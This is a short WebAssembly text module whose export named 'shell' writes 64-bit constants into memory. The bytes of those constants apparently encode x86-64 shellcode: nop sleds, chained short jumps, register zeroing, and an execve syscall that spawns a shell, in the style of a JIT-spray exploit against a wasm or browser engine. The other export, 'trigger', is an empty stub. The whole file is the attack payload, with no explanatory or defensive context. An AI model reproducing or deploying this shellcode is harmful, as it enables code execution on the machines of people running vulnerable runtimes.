(module
  (memory 1)
  (func (export "trigger")
    nop
  )
  (func (export "shell")
    i32.const 0
    i64.const 0x10eb9090ff315e54
    i64.store
    i32.const 8
    i64.const 0x6eb9000000010ba
    i64.store
    i32.const 16
    i64.const 0x6eb9090050fc031
    i64.store
    i32.const 24
    i64.const 0x6eb900000003bb8
    i64.store
    i32.const 32
    i64.const 0x6ebd231f6315f54
    i64.store
    i32.const 40
    i64.const 0x90909090feeb050f
    i64.store
  )
)
